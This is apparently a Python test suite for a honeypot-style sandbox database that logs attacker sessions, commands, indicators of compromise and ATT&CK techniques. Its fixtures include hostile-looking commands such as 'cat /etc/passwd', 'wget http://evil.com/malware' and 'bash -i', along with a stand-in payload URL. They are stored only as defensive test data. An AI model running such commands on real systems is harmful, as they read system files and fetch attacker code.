#!/usr/bin/env python3
"""
Comprehensive database manager tests
"""

import sys
import os
sys.path.insert(0, os.path.dirname(__file__))

from database import SandboxDatabase
import uuid

def test_initialization():
    """Test 1: Database initialization"""
    print("\n=== Test 1: Database Initialization ===")
    try:
        db = SandboxDatabase("/tmp/sandbox-test/test_init.db")
        print("✓ Database initialized successfully")
        
        # Check tables exist
        with db.get_connection() as conn:
            tables = conn.execute(
                "SELECT name FROM sqlite_master WHERE type='table'"
            ).fetchall()
            table_names = [t[0] for t in tables]
            
            required = ['sessions', 'command_history', 'iocs', 'attack_techniques', 'environment_vars']
            missing = [t for t in required if t not in table_names]
            
            if missing:
                print(f"✗ Missing tables: {missing}")
                return False
            
            print(f"✓ All {len(required)} required tables present")
        
        return True
    except Exception as e:
        print(f"✗ Initialization failed: {e}")
        return False

def test_session_creation():
    """Test 2: Session creation"""
    print("\n=== Test 2: Session Creation ===")
    try:
        db = SandboxDatabase("/tmp/sandbox-test/test_session.db")
        session_id = str(uuid.uuid4())
        
        # Create session
        success = db.create_session(
            session_id=session_id,
            source_ip="192.168.1.100",
            protocol="ssh",
            username="root",
            password="test123"
        )
        
        if not success:
            print("✗ Failed to create session")
            return False
        
        print(f"✓ Session created: {session_id}")
        
        # Verify session exists
        with db.get_connection() as conn:
            result = conn.execute(
                "SELECT * FROM sessions WHERE session_id = ?",
                (session_id,)
            ).fetchone()
            
            if not result:
                print("✗ Session not found in database")
                return False
            
            # Check all fields
            assert result['source_ip'] == "192.168.1.100"
            assert result['protocol'] == "ssh"
            assert result['username'] == "root"
            assert result['status'] == "active"
            
            print("✓ Session data verified")
            
            # Check environment variables were initialized
            env_count = conn.execute(
                "SELECT COUNT(*) FROM environment_vars WHERE session_id = ?",
                (session_id,)
            ).fetchone()[0]
            
            if env_count == 0:
                print("✗ Environment variables not initialized")
                return False
            
            print(f"✓ Environment variables initialized ({env_count} vars)")
        
        # Test duplicate prevention
        duplicate = db.create_session(
            session_id=session_id,
            source_ip="1.2.3.4",
            protocol="http"
        )
        
        if duplicate:
            print("✗ Duplicate session was allowed (should have failed)")
            return False
        
        print("✓ Duplicate prevention works")
        
        return True
    except Exception as e:
        print(f"✗ Session creation test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def test_command_tracking():
    """Test 3: Command history tracking"""
    print("\n=== Test 3: Command History ===")
    try:
        db = SandboxDatabase("/tmp/sandbox-test/test_commands.db")
        session_id = str(uuid.uuid4())
        
        db.create_session(session_id, "1.2.3.4", "ssh", "root")
        
        # Add multiple commands
        commands = [
            ("whoami", "root", 0, 10),
            ("ls -la", "total 0\ndrwxr-xr-x 2 root root", 0, 15),
            ("cat /etc/passwd", "root:x:0:0:root:/root:/bin/bash", 0, 20),
            ("wget http://evil.com/malware", "Connecting... failed", 1, 100)
        ]
        
        for cmd, output, exit_code, duration in commands:
            db.add_command(session_id, cmd, output, exit_code, duration)
            print(f"✓ Added command: {cmd}")
        
        # Verify commands in database
        with db.get_connection() as conn:
            result = conn.execute("""
                SELECT COUNT(*), MIN(sequence_number), MAX(sequence_number)
                FROM command_history WHERE session_id = ?
            """, (session_id,)).fetchone()
            
            count = result[0]
            min_seq = result[1]
            max_seq = result[2]
            
            if count != len(commands):
                print(f"✗ Expected {len(commands)} commands, found {count}")
                return False
            
            if min_seq != 1 or max_seq != len(commands):
                print(f"✗ Sequence numbers incorrect: {min_seq}-{max_seq}")
                return False
            
            print(f"✓ All {count} commands stored with correct sequence numbers")
            
            # Check session command count
            session = conn.execute(
                "SELECT command_count FROM sessions WHERE session_id = ?",
                (session_id,)
            ).fetchone()
            
            if session['command_count'] != len(commands):
                print(f"✗ Session command count incorrect: {session['command_count']}")
                return False
            
            print("✓ Session command count updated correctly")
        
        return True
    except Exception as e:
        print(f"✗ Command tracking test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def test_ioc_storage():
    """Test 4: IOC storage"""
    print("\n=== Test 4: IOC Storage ===")
    try:
        db = SandboxDatabase("/tmp/sandbox-test/test_iocs.db")
        session_id = str(uuid.uuid4())
        
        db.create_session(session_id, "1.2.3.4", "ssh")
        
        # Add various IOC types
        iocs = [
            ("ip", "192.168.1.100", 0.9, "command output"),
            ("domain", "evil.com", 0.85, "wget command"),
            ("url", "http://malicious.org/payload.sh", 0.95, "download attempt"),
            ("hash", "d41d8cd98f00b204e9800998ecf8427e", 0.7, "file hash"),
            ("command", "wget", 0.8, "suspicious tool")
        ]
        
        for ioc_type, value, confidence, context in iocs:
            db.add_ioc(session_id, ioc_type, value, confidence, context)
            print(f"✓ Added IOC: {ioc_type} -> {value}")
        
        # Verify IOCs
        with db.get_connection() as conn:
            stored = conn.execute(
                "SELECT COUNT(*), COUNT(DISTINCT ioc_type) FROM iocs WHERE session_id = ?",
                (session_id,)
            ).fetchone()
            
            if stored[0] != len(iocs):
                print(f"✗ Expected {len(iocs)} IOCs, found {stored[0]}")
                return False
            
            print(f"✓ All {stored[0]} IOCs stored")
            print(f"✓ {stored[1]} distinct IOC types")
            
            # Check confidence values
            iocs_list = conn.execute(
                "SELECT ioc_type, confidence FROM iocs WHERE session_id = ?",
                (session_id,)
            ).fetchall()
            
            for ioc in iocs_list:
                if ioc['confidence'] < 0 or ioc['confidence'] > 1:
                    print(f"✗ Invalid confidence: {ioc['confidence']}")
                    return False
            
            print("✓ All confidence values valid (0-1)")
        
        return True
    except Exception as e:
        print(f"✗ IOC storage test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def test_attack_techniques():
    """Test 5: ATT&CK technique storage"""
    print("\n=== Test 5: ATT&CK Techniques ===")
    try:
        db = SandboxDatabase("/tmp/sandbox-test/test_attack.db")
        session_id = str(uuid.uuid4())
        
        db.create_session(session_id, "1.2.3.4", "ssh")
        
        # Add techniques
        techniques = [
            ("T1033", "System Owner/User Discovery", "Discovery", 0.95, "whoami"),
            ("T1082", "System Information Discovery", "Discovery", 0.90, "uname -a"),
            ("T1105", "Ingress Tool Transfer", "Command and Control", 0.85, "wget malware"),
            ("T1059.004", "Unix Shell", "Execution", 0.80, "bash -i")
        ]
        
        for tid, name, tactic, conf, evidence in techniques:
            db.add_attack_technique(session_id, tid, name, tactic, conf, evidence)
            print(f"✓ Added technique: {tid} - {name}")
        
        # Verify techniques
        with db.get_connection() as conn:
            stored = conn.execute("""
                SELECT COUNT(*), COUNT(DISTINCT tactic)
                FROM attack_techniques WHERE session_id = ?
            """, (session_id,)).fetchone()
            
            if stored[0] != len(techniques):
                print(f"✗ Expected {len(techniques)} techniques, found {stored[0]}")
                return False
            
            print(f"✓ All {stored[0]} techniques stored")
            print(f"✓ {stored[1]} distinct tactics covered")
            
            # Check technique IDs format
            techs = conn.execute(
                "SELECT technique_id FROM attack_techniques WHERE session_id = ?",
                (session_id,)
            ).fetchall()
            
            for tech in techs:
                tid = tech['technique_id']
                if not tid.startswith('T'):
                    print(f"✗ Invalid technique ID format: {tid}")
                    return False
            
            print("✓ All technique IDs valid format")
        
        return True
    except Exception as e:
        print(f"✗ ATT&CK technique test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def test_session_state():
    """Test 6: Session state retrieval"""
    print("\n=== Test 6: Session State Retrieval ===")
    try:
        db = SandboxDatabase("/tmp/sandbox-test/test_state.db")
        session_id = str(uuid.uuid4())
        
        # Create session with data
        db.create_session(session_id, "1.2.3.4", "ssh", "root")
        db.add_command(session_id, "whoami", "root", 0, 10)
        db.add_command(session_id, "pwd", "/root", 0, 5)
        
        # Get state
        state = db.get_session_state(session_id)
        
        if not state:
            print("✗ State retrieval returned None")
            return False
        
        # Verify state structure
        required_keys = ['session_info', 'recent_commands', 'environment']
        for key in required_keys:
            if key not in state:
                print(f"✗ Missing key in state: {key}")
                return False
        
        print(f"✓ State structure valid")
        
        # Check session info
        if state['session_info']['session_id'] != session_id:
            print("✗ Session ID mismatch in state")
            return False
        
        print("✓ Session info correct")
        
        # Check recent commands
        if len(state['recent_commands']) != 2:
            print(f"✗ Expected 2 recent commands, got {len(state['recent_commands'])}")
            return False
        
        print(f"✓ Recent commands: {len(state['recent_commands'])}")
        
        # Check environment
        if 'HOME' not in state['environment']:
            print("✗ HOME not in environment")
            return False
        
        print(f"✓ Environment variables: {len(state['environment'])}")
        
        return True
    except Exception as e:
        print(f"✗ Session state test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def run_all_tests():
    """Run all database tests"""
    print("\n" + "="*60)
    print("SANDBOX STORE DATABASE - COMPREHENSIVE TEST SUITE")
    print("="*60)
    
    tests = [
        test_initialization,
        test_session_creation,
        test_command_tracking,
        test_ioc_storage,
        test_attack_techniques,
        test_session_state
    ]
    
    results = []
    for test in tests:
        try:
            result = test()
            results.append((test.__name__, result))
        except Exception as e:
            print(f"\n✗ Test crashed: {test.__name__}")
            print(f"  Error: {e}")
            results.append((test.__name__, False))
    
    # Summary
    print("\n" + "="*60)
    print("TEST SUMMARY")
    print("="*60)
    
    passed = sum(1 for _, result in results if result)
    total = len(results)
    
    for name, result in results:
        status = "✓ PASS" if result else "✗ FAIL"
        print(f"{status}: {name}")
    
    print(f"\nResults: {passed}/{total} tests passed")
    
    if passed == total:
        print("\n🎉 ALL TESTS PASSED! Database is ready.")
        return 0
    else:
        print(f"\n⚠️  {total - passed} test(s) failed. Fix issues before proceeding.")
        return 1

if __name__ == "__main__":
    exit(run_all_tests())
